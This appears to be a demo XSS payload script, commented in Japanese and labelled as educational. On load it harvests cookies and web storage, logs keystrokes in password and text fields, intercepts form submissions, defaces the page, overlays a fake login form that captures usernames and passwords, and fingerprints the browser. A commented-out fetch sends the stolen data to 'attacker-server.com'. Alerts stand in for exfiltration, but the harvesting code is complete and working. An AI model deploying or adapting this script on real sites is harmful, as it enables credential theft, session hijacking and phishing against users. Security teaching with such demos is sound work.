// ⚠️ 警告：このファイルは教育目的のデモ用です
// 実際のWebアプリケーションでは絶対に使用しないでください

console.log("🚨 悪意のあるスクリプトが実行されました！");

// 1. 個人情報の窃取シミュレーション
function stealPersonalInfo() {
  const personalData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    currentURL: window.location.href,
    referrer: document.referrer,
    timestamp: new Date().toISOString(),
  };

  console.log("💀 窃取された個人情報:", personalData);

  // 実際の攻撃では外部サーバーに送信される
  // fetch('https://attacker-server.com/steal', {
  //   method: 'POST',
  //   body: JSON.stringify(personalData)
  // });

  return personalData;
}

// 2. フォームデータの盗聴
function hijackFormData() {
  const forms = document.querySelectorAll("form");
  const inputs = document.querySelectorAll(
    'input[type="password"], input[type="text"], input[type="email"]'
  );

  forms.forEach((form) => {
    form.addEventListener("submit", function (e) {
      const formData = new FormData(form);
      const data = {};
      for (let [key, value] of formData.entries()) {
        data[key] = value;
      }
      console.log("🎣 フォームデータを傍受:", data);

      // 実際の攻撃では盗んだデータを外部に送信
      alert(
        `⚠️ フォームデータが攻撃者に送信されました！\n${JSON.stringify(
          data,
          null,
          2
        )}`
      );
    });
  });

  inputs.forEach((input) => {
    input.addEventListener("input", function (e) {
      console.log(
        `🔑 キーストローク記録: ${e.target.name || e.target.id} = ${
          e.target.value
        }`
      );
    });
  });
}

// 3. セッションハイジャック
function hijackSession() {
  if (document.cookie) {
    console.log("🍪 セッションクッキーを発見:", document.cookie);

    // セッションクッキーを攻撃者サーバーに送信（デモ）
    const sessionData = {
      cookies: document.cookie,
      domain: window.location.hostname,
      path: window.location.pathname,
    };

    alert(
      `🚨 セッションハイジャック攻撃！\nあなたのセッション情報が盗まれました:\n${JSON.stringify(
        sessionData,
        null,
        2
      )}`
    );
  }
}

// 4. DOM改ざん攻撃
function defaceWebsite() {
  // ページの見た目を改ざん
  const style = document.createElement("style");
  style.textContent = `
    body::before {
      content: "🚨 このサイトは攻撃者によって改ざんされました 🚨";
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background: red;
      color: white;
      text-align: center;
      padding: 10px;
      font-weight: bold;
      z-index: 9999;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0.3; }
    }
  `;
  document.head.appendChild(style);

  // 5秒後に元に戻す（デモ用）
  setTimeout(() => {
    document.head.removeChild(style);
    console.log("サイトの見た目が復元されました（デモ終了）");
  }, 5000);
}

// 5. 偽ログインフォーム挿入
function injectFakeLoginForm() {
  const overlay = document.createElement("div");
  overlay.id = "fake-login-overlay";
  overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    z-index: 10000;
    display: flex;
    justify-content: center;
    align-items: center;
  `;

  overlay.innerHTML = `
    <div style="background: white; padding: 20px; border-radius: 8px; max-width: 400px; color: black;">
      <h3>🔒 セキュリティ確認</h3>
      <p>セキュリティ上の理由により、再度ログインが必要です。</p>
      <form id="fake-login-form">
        <input type="text" placeholder="ユーザー名" required style="width: 100%; margin: 5px 0; padding: 8px;">
        <input type="password" placeholder="パスワード" required style="width: 100%; margin: 5px 0; padding: 8px;">
        <button type="submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px;">ログイン</button>
        <button type="button" onclick="document.getElementById('fake-login-overlay').remove()" style="width: 100%; padding: 8px; margin-top: 5px; background: #6c757d; color: white; border: none; border-radius: 4px;">キャンセル</button>
      </form>
    </div>
  `;

  document.body.appendChild(overlay);

  document
    .getElementById("fake-login-form")
    .addEventListener("submit", function (e) {
      e.preventDefault();
      const username = e.target.elements[0].value;
      const password = e.target.elements[1].value;

      alert(
        `🎣 フィッシング成功！\n攻撃者が以下の情報を取得:\nユーザー名: ${username}\nパスワード: ${password}`
      );
      overlay.remove();
    });
}

// 6. ブラウザ情報の詳細収集
function collectBrowserFingerprint() {
  const fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screenResolution: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory || "unknown",
    connection: navigator.connection
      ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
        }
      : "unknown",
    plugins: Array.from(navigator.plugins).map((p) => p.name),
    canvas: getCanvasFingerprint(),
  };

  console.log("🔍 ブラウザフィンガープリント収集完了:", fingerprint);
  return fingerprint;
}

function getCanvasFingerprint() {
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  ctx.textBaseline = "top";
  ctx.font = "14px Arial";
  ctx.fillText("Browser fingerprinting text", 2, 2);
  return canvas.toDataURL();
}

// 7. メイン攻撃実行関数
function executeAttack() {
  console.log("🎯 XSS攻撃シーケンス開始...");

  // 段階的に攻撃を実行
  setTimeout(() => {
    stealPersonalInfo();
  }, 500);

  setTimeout(() => {
    hijackFormData();
  }, 1000);

  setTimeout(() => {
    hijackSession();
  }, 1500);

  setTimeout(() => {
    collectBrowserFingerprint();
  }, 2000);

  setTimeout(() => {
    defaceWebsite();
  }, 2500);

  setTimeout(() => {
    const shouldShowFakeLogin = confirm(
      "デモ: 偽ログインフォームの挿入を実行しますか？\n（実際の攻撃ではユーザーの同意なく実行されます）"
    );
    if (shouldShowFakeLogin) {
      injectFakeLoginForm();
    }
  }, 3000);
}

// 攻撃の開始
console.log("💀 悪意のあるスクリプトが読み込まれました");
console.log("🎯 攻撃の詳細:");
console.log("- 個人情報の窃取");
console.log("- フォームデータの傍受");
console.log("- セッションハイジャック");
console.log("- サイト改ざん");
console.log("- フィッシング攻撃");
console.log("- ブラウザフィンガープリンティング");

// 実際の攻撃開始
executeAttack();

// グローバルスコープに関数を露出（デバッグ用）
window.maliciousDemo = {
  stealPersonalInfo,
  hijackFormData,
  hijackSession,
  defaceWebsite,
  injectFakeLoginForm,
  collectBrowserFingerprint,
  executeAttack,
};
